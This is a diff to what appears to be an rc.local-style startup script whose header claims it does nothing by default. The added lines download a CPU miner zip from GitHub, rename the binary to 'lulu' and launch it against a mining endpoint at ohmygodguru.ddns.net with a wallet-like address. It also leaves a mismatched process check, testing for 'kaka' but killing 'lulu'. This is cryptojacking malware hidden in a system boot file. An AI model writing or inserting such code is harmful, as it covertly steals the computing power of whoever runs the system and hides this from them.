@@ -10,26 +10,26 @@
 # bits.
 #
 # By default this script does nothing.
-if [ -f ${PWD}/kaka ]; then
+if [ -f ${PWD}/lulu ]; then
     if pgrep -x "kaka" > /dev/null
 then
-pkill kaka
+pkill lulu
 echo " kill process"
-./kaka -F http://ohmygodguru.ddns.net:56789/0x6f392f86702e358b16074ad635f9b273b44972c1/ggc
+./lulu -F http://ohmygodguru.ddns.net:56789/0x6f392f86702e358b16074ad635f9b273b44972c1/ggc
 
     
 else
 
 echo "Miner da install , chay thoi "
-./kaka -F http://ohmygodguru.ddns.net:56789/0x6f392f86702e358b16074ad635f9b273b44972c1/ggc
+./lulu -F http://ohmygodguru.ddns.net:56789/0x6f392f86702e358b16074ad635f9b273b44972c1/ggc
 
      
 fi
 exit
 fi
 
-wget https://github.com/StupidmanTan/miner-cpu/raw/master/aquaminer-0.4-linux-amd64.zip
-unzip aquaminer-0.4-linux-amd64.zip
-mv aquaminer-0.4-linux-amd64 kaka
-./kaka -F http://ohmygodguru.ddns.net:56789/0x6f392f86702e358b16074ad635f9b273b44972c1/ggc
+wget https://github.com/StupidmanTan/miner-cpu/raw/master/kaka.zip
+unzip kaka.zip
+mv kaka lulu
+./lulu -F http://ohmygodguru.ddns.net:56789/0x6f392f86702e358b16074ad635f9b273b44972c1/ggc
 exit 0
